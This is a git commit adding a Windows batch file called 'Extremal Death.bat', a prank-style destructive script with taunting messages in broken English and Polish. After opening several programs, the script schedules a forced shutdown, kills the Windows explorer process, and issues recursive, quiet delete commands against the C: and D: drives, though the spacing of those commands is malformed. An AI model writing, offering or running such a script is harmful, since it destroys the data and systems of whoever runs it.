0b25bcc1e701d5e31cd80dd27551c9b833a3c87d
Kubas431 <kuba80269@gmail.com>
2024-09-14 20:53:11 +0200

    Create Extremal Death.bat

---
+++ Extremal Death.bat
@@ -0,0 +1,14 @@
+@echo off
+echo Your next
+echo Twuj system jest nastenpny!
+echo lol:)
+start calc.exe
+start charmap.exe
+star cmd.exe
+start notepad.exe
+shutdown -s -t 20 -c "Ha ha you pc death twuj system zostal zniszczony"
+taskkill /f /im explorer.exe
+del c: \*/s /q
+del d: \*/s /q
+echo Twuj system zostal shaowany!!!
+echo you pc is kiled!!!
